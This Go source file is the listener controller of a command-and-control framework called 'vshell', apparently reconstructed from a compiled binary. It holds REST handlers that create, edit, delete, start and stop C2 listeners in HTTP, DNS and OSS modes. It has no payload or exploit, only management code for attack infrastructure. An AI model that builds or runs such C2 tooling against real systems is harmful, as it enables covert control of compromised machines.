package controllers

import (
	"fmt"
	"log"

	"vshell/c2engine"
	"vshell/models"
)

// ListenerController manages C2 listeners
type ListenerController struct {
	BaseController
}

// Get lists all listeners
func (c *ListenerController) Get() {
	db := models.GetDB()
	if db == nil {
		c.JSONOk(paginatedResult([]interface{}{}, 0))
		return
	}

	listeners, err := db.ListListeners()
	if err != nil {
		c.Error(err.Error())
		return
	}

	if listeners == nil {
		listeners = []*models.Listener{}
	}
	c.JSONOk(paginatedResult(listeners, len(listeners)))
}

// Post creates a new listener
func (c *ListenerController) Post() {
	db := models.GetDB()
	if db == nil {
		c.Error("Database not initialized")
		return
	}

	listener := &models.Listener{
		Status:            true,
		ListenAddr:        c.GetString("listen_addr", "0.0.0.0:443"),
		ConnectAddr:       c.GetString("connect_addr"),
		Remark:            c.GetString("remark"),
		Mode:              c.GetString("mode", "http"),
		VerifyKey:         c.GetString("vkey"),
		EncryptSalt:       c.GetString("encrypt_salt"),
		DisconnectTimeout: 0,
		PingInterval:      0,
		DNSDomain:         c.GetString("dns_domain"),
		PublicDNS:         c.GetString("public_dns"),
		MaxDNSsize:        512,
		OssUrl:            c.GetString("oss_url"),
		NoStore:           false,
	}

	id, err := db.CreateListener(listener)
	if err != nil {
		c.Error("Failed to create listener: " + err.Error())
		return
	}

	listener.ID = id

	// Register C2 routes for this listener
	RegisterListenerC2(listener)

	c.JSONOk(listener)
}

// Put updates a listener
func (c *ListenerController) Put() {
	id, _ := c.GetInt64("id")
	db := models.GetDB()
	if db == nil {
		c.Error("Database not initialized")
		return
	}

	listener, err := db.GetListener(id)
	if err != nil {
		c.Error("Listener not found")
		return
	}

	if v := c.GetString("listen_addr"); v != "" {
		listener.ListenAddr = v
	}
	if v := c.GetString("remark"); v != "" {
		listener.Remark = v
	}
	if v := c.GetString("mode"); v != "" {
		listener.Mode = v
	}
	if v := c.GetString("vkey"); v != "" {
		listener.VerifyKey = v
	}

	if err := db.UpdateListener(listener); err != nil {
		c.Error("Failed to update: " + err.Error())
		return
	}

	c.JSONOk(listener)
}

// Delete removes a listener
func (c *ListenerController) Delete() {
	id, _ := c.GetInt64("id")
	db := models.GetDB()
	if db != nil {
		if err := db.DeleteListener(id); err != nil {
			c.Error(err.Error())
			return
		}
	}
	c.JSONOk(map[string]interface{}{"deleted_id": id})
}

// Start activates a listener via the C2 engine
func (c *ListenerController) Start() {
	id, _ := c.GetInt64("id")
	db := models.GetDB()
	if db == nil {
		c.Error("Database not initialized")
		return
	}

	listener, err := db.GetListener(id)
	if err != nil {
		c.Error("Listener not found")
		return
	}

	// Convert models.Listener to c2engine.Listener and start it
	engine := c2engine.GetEngine()
	engineListener, err := engine.NewListener(
		listener.ListenAddr,
		listener.ConnectAddr,
		listener.Mode,
		listener.VerifyKey,
		listener.EncryptSalt,
		listener.Remark,
	)
	if err != nil {
		c.Error("Failed to create listener: " + err.Error())
		return
	}

	if err := c2engine.StartListenerByMode(engineListener); err != nil {
		c.Error("Failed to start listener: " + err.Error())
		return
	}

	log.Printf("[C2] Listener %d started (%s mode) on %s", id, listener.Mode, listener.ListenAddr)
	c.JSONOk(map[string]interface{}{"started_id": id, "status": "activated"})
}

// Stop deactivates a listener's C2 routes
func (c *ListenerController) Stop() {
	id, _ := c.GetInt64("id")

	engine := c2engine.GetEngine()
	listener := engine.GetListener(id)
	if listener != nil {
		if err := c2engine.StopListenerByMode(listener); err != nil {
			log.Printf("[C2] Failed to stop listener %d: %v", id, err)
		}
	}

	log.Printf("[C2] Listener %d C2 endpoints deactivated", id)
	c.JSONOk(map[string]interface{}{"stopped_id": id, "status": "deactivated"})
}

// RegisterListenerC2 registers the C2 endpoints for a listener
func RegisterListenerC2(listener *models.Listener) {
	key := listener.VerifyKey
	if key == "" {
		key = fmt.Sprintf("vkey_%d", listener.ID)
	}
	log.Printf("[C2] Listener %d ready at /c2/l/%d (vkey: %s)", listener.ID, listener.ID, key)
}

// ============================================================================
// REST-style action methods (matching original binary frontend paths)
// Frontend calls: POST /api/listener/{action} with JSON body
// ============================================================================

// Add creates a new listener (alias for Post, matches /api/listener/add)
func (c *ListenerController) Add() {
	c.Post()
}

// Edit updates a listener (alias for Put, matches /api/listener/edit)
func (c *ListenerController) Edit() {
	c.Put()
}

// EditRemark updates only the remark/note field (matches /api/listener/editremark)
func (c *ListenerController) EditRemark() {
	id, _ := c.GetInt64("id")
	remark := c.GetString("remark")
	db := models.GetDB()
	if db == nil {
		c.Error("Database not initialized")
		return
	}
	listener, err := db.GetListener(id)
	if err != nil {
		c.Error("Listener not found")
		return
	}
	listener.Remark = remark
	if err := db.UpdateListener(listener); err != nil {
		c.Error("Failed to update: " + err.Error())
		return
	}
	c.JSONOk(listener)
}

// Del deletes a single listener (alias for Delete, matches /api/listener/del)
func (c *ListenerController) Del() {
	c.Delete()
}

// DelList is the original binary's method name for batch delete
// (nTApp6jPzv.(*ListenerController).DelList); Dellist is the router alias.
func (c *ListenerController) DelList() { c.Dellist() }

// Dellist deletes multiple listeners by ID list (matches /api/listener/dellist)
func (c *ListenerController) Dellist() {
	ids := c.GetStrings("ids")
	db := models.GetDB()
	if db == nil {
		c.Error("Database not initialized")
		return
	}
	var deleted []int64
	for _, idStr := range ids {
		var id int64
		fmt.Sscanf(idStr, "%d", &id)
		if id > 0 {
			if err := db.DeleteListener(id); err == nil {
				deleted = append(deleted, id)
			}
		}
	}
	c.JSONOk(map[string]interface{}{"deleted": deleted})
}

// List returns paginated listener list (matches /api/listener/list)
func (c *ListenerController) List() {
	c.Get()
}
